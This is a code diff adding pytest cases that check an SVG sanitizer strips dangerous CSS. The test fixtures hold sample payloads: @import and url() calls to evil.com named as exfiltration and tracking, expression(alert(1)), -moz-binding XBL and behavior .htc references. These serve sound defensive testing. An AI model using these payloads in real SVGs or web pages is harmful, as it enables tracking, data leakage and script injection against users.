@@ -414,6 +414,145 @@ class TestSanitizeSvg:
         with pytest.raises(ValueError, match="Invalid XML"):
             sanitize_svg(xxe)
 
+    # ── CSS-based attack vectors (style elements & attributes) ─────────
+
+    def test_strips_style_with_import(self):
+        """<style> with @import is dangerous — loads external stylesheet."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>@import url('https://evil.com/exfil.css');</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"@import" not in result
+        assert b"evil.com" not in result
+        assert b"<rect" in result
+
+    def test_strips_style_with_url_function(self):
+        """<style> with url() is dangerous — loads external resources."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>.bg { background: url('https://evil.com/track.gif'); }</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"url(" not in result
+        assert b"evil.com" not in result
+
+    def test_strips_style_with_expression(self):
+        """<style> with expression() is dangerous — IE JS execution."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>.x { width: expression(alert(1)); }</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"expression" not in result
+        assert b"alert" not in result
+
+    def test_strips_style_with_moz_binding(self):
+        """<style> with -moz-binding is dangerous — Firefox XBL."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>.x { -moz-binding: url('https://evil.com/xbl.xml#xss'); }</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"-moz-binding" not in result
+        assert b"evil.com" not in result
+
+    def test_strips_style_with_behavior(self):
+        """<style> with behavior: is dangerous — IE DHTML behaviors."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>.x { behavior: url('exploit.htc'); }</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"behavior" not in result
+        assert b"exploit.htc" not in result
+
+    def test_preserves_safe_style_element(self):
+        """<style> with only safe CSS (fills, fonts, classes) is preserved."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>.cls-1 { fill: red; stroke: #000; stroke-width: 2; }</style>"
+            b'<rect class="cls-1" width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"<style" in result or b":style" in result
+        assert b"fill: red" in result
+        assert b"stroke: #000" in result
+
+    def test_partially_sanitizes_style_element(self):
+        """<style> with mixed safe/dangerous lines keeps only safe lines."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>\n"
+            b".safe { fill: blue; }\n"
+            b"@import url('https://evil.com/steal.css');\n"
+            b".also-safe { stroke: red; }\n"
+            b"</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"fill: blue" in result
+        assert b"stroke: red" in result
+        assert b"@import" not in result
+        assert b"evil.com" not in result
+
+    def test_removes_fully_dangerous_style_element(self):
+        """<style> with only dangerous CSS is removed entirely."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<style>@import url('https://evil.com/exfil.css');</style>"
+            b'<rect width="50" height="50"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        # The entire <style> element should be gone when all content is stripped
+        assert b"<style" not in result and b":style" not in result
+
+    def test_strips_inline_style_with_url(self):
+        """Inline style attribute with url() is sanitized."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b"<rect width=\"50\" height=\"50\" style=\"background: url('https://evil.com/track.gif');\"/>"
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"url(" not in result
+        assert b"evil.com" not in result
+
+    def test_strips_inline_style_with_expression(self):
+        """Inline style attribute with expression() is sanitized."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b'<rect width="50" height="50" style="width: expression(alert(1));"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"expression" not in result
+        assert b"alert" not in result
+
+    def test_preserves_safe_inline_style(self):
+        """Inline style attribute with safe CSS is preserved."""
+        svg = (
+            b'<svg xmlns="http://www.w3.org/2000/svg">'
+            b'<rect width="50" height="50" style="fill: red; opacity: 0.5;"/>'
+            b"</svg>"
+        )
+        result = sanitize_svg(svg)
+        assert b"fill: red" in result
+        assert b"opacity: 0.5" in result
+
     # ── Combined attack vectors ───────────────────────────────────────
 
     def test_combined_attack_fully_sanitized(self):
